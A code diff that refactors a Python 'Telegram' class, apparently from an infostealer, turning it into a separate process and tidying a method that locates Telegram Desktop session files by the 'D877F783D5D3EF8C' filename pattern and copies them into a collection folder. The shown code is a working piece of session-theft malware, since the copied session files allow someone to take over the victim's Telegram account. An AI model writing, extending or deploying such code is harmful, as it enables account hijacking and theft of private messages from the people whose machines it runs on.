@@ -1,13 +1,15 @@
 from re import findall
 from shutil import copyfile
+from multiprocessing import Process
 from os import listdir, path, makedirs
 
 from ..utils.config import TelegramConfig
 
 
-class Telegram:
+class Telegram(Process):
 
     def __init__(self, *args):
+        Process.__init__(self)
 
         self.config = TelegramConfig()
 
@@ -23,14 +25,13 @@ class Telegram:
 
     def __get_sessions(self):
 
-        folder = rf"{self.storage_path}\{self.folder}"
-
         if not path.exists(self.config.SessionsPath):
             return
 
+        folder = rf"{self.storage_path}\{self.folder}"
         sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])
 
-        if len(sessions) < 1:
+        if not sessions:
             return
 
         self.__create_folder()
